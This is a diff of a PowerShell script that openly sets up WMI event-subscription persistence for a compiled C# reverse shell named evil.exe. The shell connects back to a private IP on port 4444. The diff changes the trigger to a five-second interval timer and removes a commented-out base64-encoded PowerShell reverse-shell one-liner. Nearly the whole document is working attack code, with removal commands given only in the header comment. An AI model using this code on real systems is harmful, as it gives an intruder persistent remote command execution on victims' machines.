@@ -5,11 +5,14 @@ To remove Events run following
 Get-WmiObject __EventFilter -namespace root\subscription -filter "name='EvilExeFilter'" | Remove-WmiObject
 Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='EvilExeConsumer'" | Remove-WmiObject
 Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='EvilExeFilter'""" | Remove-WmiObject
+Remove-CimInstance -Query 'select * from __IntervalTimerInstruction where TimerId="MyTimerId"'
 
 
 
 #>
 
+$workingDirectory = (Get-location).Path.ToString()
+$pathToEvil = $workingDirectory + "\evil.exe"
 
 $source = @"
 using System;
@@ -30,7 +33,7 @@ namespace ConnectBack
 
         public static void Main(string[] args)
         {
-            using (TcpClient client = new TcpClient("192.168.0.12", 4444))
+            using (TcpClient client = new TcpClient("192.168.0.14", 4444))
             {
                 using (Stream stream = client.GetStream())
                 {
@@ -83,17 +86,12 @@ namespace ConnectBack
 }
 "@
 
-Add-Type -TypeDefinition $source -Language CSharp -OutputAssembly "evil.exe" -OutputType ConsoleApplication
+Add-Type -TypeDefinition $source -Language CSharp -OutputAssembly $pathToEvil -OutputType ConsoleApplication
 
-#$encoded = [System.Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$client = New-Object System.Net.Sockets.TCPClient("192.168.0.14",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'))
+New-CimInstance -ClassName __IntervalTimerInstruction -Property @{TimerId="MyTimerId";IntervalBetweenEvents=[uint32]5000}
 
-#powershell.exe -enc  $encoded
 
-#C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe
-
-$WQLQuery = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 
-             WHERE TargetInstance ISA "Win32_Process"
-             AND TargetInstance.Name <> "evil.exe"'
+$WQLQuery = 'SELECT * FROM __TimerEvent where TimerId="MyTimerId"'
 
 $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="EvilExeFilter";
                     EventNameSpace="root\cimv2";
@@ -102,8 +100,8 @@ $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscrip
 
 
 $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="EvilExeConsumer";
-                 ExecutablePath = "C:\\Users\sunny\\test\\evil.exe";
-                 CommandLineTemplate = "C:\\Users\sunny\\test\\evil.exe"
+                 ExecutablePath = $pathToEvil;
+                 CommandLineTemplate = $pathToEvil
                 }
 
 
